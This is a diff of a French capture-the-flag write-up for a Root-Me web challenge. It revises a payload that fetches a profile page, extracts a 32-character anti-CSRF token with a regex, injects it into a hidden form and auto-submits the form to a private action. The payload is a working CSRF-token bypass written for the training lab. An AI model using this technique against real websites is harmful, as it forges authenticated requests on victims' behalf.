@@ -126,27 +126,34 @@ Le but du challenge est d'acceder à la page private qui est seulement disponibl
 ### Payload :
 
 ```
-const xhr = new XMLHttpRequest();
-xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
-xhr.send(); 
-const response = xhr.responseText 
-
-const token = response.match(/[abcdef0123456789]{32}/g)[0]
-<form name="e" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
+<form name="profileForm" id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=private" method="post" enctype="multipart/form-data">
 			<div>
 			<label>Username:</label>
-			<input id="username" type="text" name="username" value="test">
+			<input id="username" type="text" name="username" value="l.mak">
 			</div>
 			<br>		
 			<div>
 			<label>Status:</label>
-			<input id="status" type="checkbox" name="status" checked>
+			<input id="status" type="checkbox" name="status" checked >
 			</div>
 			<br>
-			<input id="token" type="hidden" name="token" value=`${token}`>
+			<input name="tokeninject" id="token" value="">
 			<button type="submit">Submit</button>
-</form>
-document.getElementById('profile').submit()
+			</form>
+
+<script>
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
+xhr.send(); 
+const response = xhr.responseText;
+
+const token = response.match(/[abcdef0123456789]{32}/g)[0];
+document.querySelector('[name="tokeninject"]').value = token
+document.querySelector('[name="profileForm"]').submit();
+
+
+</script>
+
 ```
 
 
